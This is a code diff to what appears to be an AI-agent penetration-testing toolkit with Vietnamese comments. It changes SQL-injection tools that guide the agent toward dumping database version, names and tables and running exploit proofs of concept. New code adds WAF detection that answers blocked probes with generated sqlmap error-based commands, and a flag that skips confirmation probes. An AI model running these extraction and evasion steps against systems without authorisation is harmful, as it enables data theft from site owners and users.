@@ -571,15 +571,26 @@ def _sqli_manual_test(**kw):
         lines.append(
             "[→] BƯỚC TIẾP THEO: (1) sqli_blind_extract {url, action:'version' hoặc "
             + (f"'database', engine:'mssql', method:'{method}', param:'{param}', "
-               f"data:'{param}={seed}'" if method == "post" else "engine:'mssql' "
-               "(time-based nếu oracle không ăn)")
+               f"data:'{param}={seed}', known_confirmed:true" if method == "post"
+               else "engine:'mssql', known_confirmed:true "
+               "(bỏ qua lưới 9 probe — lỗi đã xác nhận)")
             + "} để trích xuất @@VERSION/DB_NAME()/tables/dump; "
               "(2) generate_poc → poc_executor với poc_path để chạy POC khai thác.")
     else:
-        lines.append(f"[-] SQLI NOT_CONFIRMED — quote-differential âm tính"
-                     + (f" và time-based {engine} không tạo phản hồi chậm" if time_rows else "")
-                     + ". Thử sqlmap_check/sqli_blind_extract hoặc param khác trong form "
-                       "(find_forms).")
+        if len(rows) and all(st == 0 for _, _, st, _, _ in rows):
+            # v1.4.6: mọi probe status-0 → nghi WAF chặn payload
+            dbms = engine if engine in ("mssql", "mysql") else "mssql"
+            form = " --form" if method == "post" else ""
+            lines.append(
+                "[-] SQLI NOT_CONFIRMED — mọi probe bị reset (status 0). "
+                "Nghi WAF chặn payload → không spam thêm; chạy "
+                f"sqlmap{form} -u {url} --dbms={dbms} --technique=E --batch "
+                "(WAF hay chặn time-based → dùng error-based E).")
+        else:
+            lines.append(f"[-] SQLI NOT_CONFIRMED — quote-differential âm tính"
+                         + (f" và time-based {engine} không tạo phản hồi chậm" if time_rows else "")
+                         + ". Thử sqlmap_check/sqli_blind_extract hoặc param khác trong form "
+                           "(find_forms).")
     lines.append(f"[+] verdict: {verdict}" + (f" — {method_used}" if method_used else ""))
     return "\n".join(lines)
 
@@ -593,6 +604,9 @@ def _sqli_blind_extract(**kw):
     detect/extract trên form tìm kiếm (vd /WebTinTuc/TimKiem keyword).
     v1.4.5: engine=mssql → ưu tiên error-based oracle (CONVERT(int,...) đọc từ
     lỗi 500) trước time-based; đọc @@VERSION/DB_NAME()/SUSER_SNAME()/tables/dump.
+    v1.4.6: known_confirmed=true → bỏ qua lưới 9 probe nếu lỗi đã xác nhận ở
+    phiên trước; WAF burst (≥2 probe status-0) → dừng sớm + hướng dẫn
+    sqlmap --technique=E (thêm --form khi method=post).
     """
     action = kw.get("action", "detect")
     try:
@@ -615,6 +629,7 @@ def _sqli_blind_extract(**kw):
         method=str(kw.get("method") or "get"),
         param=kw.get("param") or None,
         data=kw.get("data") or None,
+        known_confirmed=bool(kw.get("known_confirmed", False)),
     )
     try:
         res = ex.report(action,
@@ -627,10 +642,24 @@ def _sqli_blind_extract(**kw):
         return f"[!] sqli_blind_extract lỗi: {e}"
     if not res.get("confirmed"):
         err = res.get("error") or "unknown"
-        return (f"[-] SQLi NOT CONFIRMED — {err}\n"
-                f"[i] URL: {kw['url']} (delay={ex.delay}s, threshold={ex.threshold}s)")
+        out = (f"[-] SQLi NOT CONFIRMED — {err}\n"
+               f"[i] URL: {kw['url']} (delay={ex.delay}s, threshold={ex.threshold}s)")
+        if res.get("waf_suspected"):
+            # v1.4.6: WAF chặn probe → hướng sqlmap error-based E
+            form = " --form" if str(kw.get("method") or "get").lower() == "post" else ""
+            dbms = str(kw.get("engine") or "mysql")
+            if dbms not in ("mssql", "mysql"):
+                dbms = "mssql"
+            out += (f"\n[!] WAF suspected (probe status-0) — chạy: "
+                    f"sqlmap{form} -u {kw['url']} --dbms={dbms} "
+                    f"--technique=E --batch")
+        return out
     lines = [f"[✓] SQLi CONFIRMED — {res.get('injection') or ''}",
              f"[i] mode={res.get('mode')} · delay={ex.delay}s · threshold={ex.threshold}s"]
+    if ex.known_confirmed:
+        # v1.4.6: lỗi đã xác nhận ở phiên trước → bỏ qua lưới 9 probe
+        lines.append("[i] known_confirmed: true — bỏ qua lưới 9 probe "
+                     "(lỗi đã xác nhận từ trước)")
     data = res.get("data") or {}
     for k, v in data.items():
         if v is None:
@@ -1141,7 +1170,9 @@ TOOL_REGISTRY: list[ToolSpec] = [
                   "param": {"type": "string",
                             "description": "Tham số/field cần inject (mặc định tự tìm; POST bắt buộc truyền, vd 'keyword')"},
                   "data": {"type": "string",
-                           "description": "Form data khi method=post, vd 'keyword=tin+tuc'"}},
+                           "description": "Form data khi method=post, vd 'keyword=tin+tuc'"},
+                  "known_confirmed": {"type": "boolean",
+                                       "description": "true khi lỗi đã xác nhận ở phiên trước (sqli_manual_test CONFIRMED) — bỏ qua lưới 9 probe quote/comment, xác nhận ngay sau baseline"}},
               "required": ["url"]},
              _sqli_blind_extract, risk="active"),
     ToolSpec("generate_poc",
